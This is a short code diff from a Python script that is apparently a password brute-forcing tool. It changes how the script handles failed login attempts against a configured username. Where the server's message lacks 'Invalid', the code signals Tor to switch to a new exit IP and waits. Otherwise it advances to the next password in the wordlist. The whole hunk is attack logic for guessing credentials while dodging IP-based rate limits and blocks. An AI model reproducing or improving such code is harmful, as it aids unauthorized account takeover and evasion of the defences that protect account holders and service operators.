@@ -357,10 +357,14 @@ if __name__ == '__main__': # check if this script is not loaded
                             current_line += 1
                             password_passed = True
                         else:
-                            progress_status = ' [*] changing ip... '
-                            print_progress(int(int(current_line/password_file_length*100)/100*ptotal) , ptotal )
-                            controller.signal(Signal.NEWNYM) # signal tor to change ip 
-                            sleep(3)
+                            if 'Invalid' not in message['message']:
+                                progress_status = ' [*] changing ip... '
+                                print_progress(int(int(current_line/password_file_length*100)/100*ptotal) , ptotal )
+                                controller.signal(Signal.NEWNYM) # signal tor to change ip 
+                                sleep(3)
+                            else:
+                                current_line +=1
+                                password_passed = True
 
 # report error if password is not found!
 log_results(attackConfig['username'] , "" , False)
